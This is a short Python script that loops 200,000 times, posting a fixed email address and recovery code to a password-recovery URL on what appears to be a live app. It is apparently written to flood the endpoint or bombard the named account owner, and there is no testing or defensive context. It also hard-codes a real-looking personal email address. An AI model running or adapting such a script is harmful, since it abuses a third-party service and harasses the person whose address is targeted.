import os
import requests


data = {"email": "naimgomezcn@gmail.com", "code": "842400"}
url = "https://taplock.app/recover-password/"

for i in range(200000):
	response = requests.post(url, data)	
	#print(i, "- ", response)
  
print("FIN")
